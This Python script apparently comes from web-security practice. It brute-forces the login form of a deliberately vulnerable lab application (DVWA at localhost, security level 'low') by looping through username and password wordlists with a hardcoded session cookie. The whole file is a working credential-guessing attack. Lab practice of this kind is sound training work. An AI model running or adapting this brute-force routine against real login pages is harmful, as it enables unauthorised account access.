import requests

url = "http://127.0.0.1:4280/vulnerabilities/brute/"
user_file = "users.txt"
password_file = "passwords.txt"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "PHPSESSID=069b3f23d067f01d683a26fa795d25d7;security=low"
}


def authenticate(username, password):
    data = {
        "username": username,
        "password": password,
        "Login": "Login"
    }
    
    response = requests.get(url, params=data, headers=headers)
    if "incorrect" not in response.text:
        print(f"✨Success: {username}:{password}")
        return True
    else:
        return False

with open(user_file, "r") as users, open(password_file, "r") as passwords:
    for username in users:
        username = username.strip()
        for password in passwords:
            password = password.strip()
            if authenticate(username, password):
                break  
        passwords.seek(0) 
